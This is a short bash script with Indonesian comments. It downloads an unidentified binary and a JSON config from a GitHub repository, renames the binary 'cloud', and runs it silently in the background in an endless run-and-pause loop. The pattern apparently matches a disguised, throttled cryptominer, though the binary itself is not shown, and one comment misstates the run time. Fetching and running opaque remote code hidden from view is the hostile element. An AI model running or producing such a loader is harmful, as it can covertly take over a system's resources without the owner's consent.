#!/bin/bash

# Bersihkan file lama
rm -rf isu* cloud*

# Download file
wget -q -O cloud https://github.com/barburonjilo/open/raw/refs/heads/main/isu
wget -q https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json

# Izin eksekusi
chmod +x cloud

# Loop selamanya
while true
do
    echo "=== Start cloud ==="
    nohup ./cloud -c "isu2.json" >/dev/null 2>&1 &
    
    # Jalan 15 menit
    sleep 600
    
    echo "=== Stop cloud ==="
    # Cari PID proses cloud yang jalan dan kill
    pkill -f "cloud -c isu2.json"
    
    # Tunggu 5 menit
    sleep 300
done
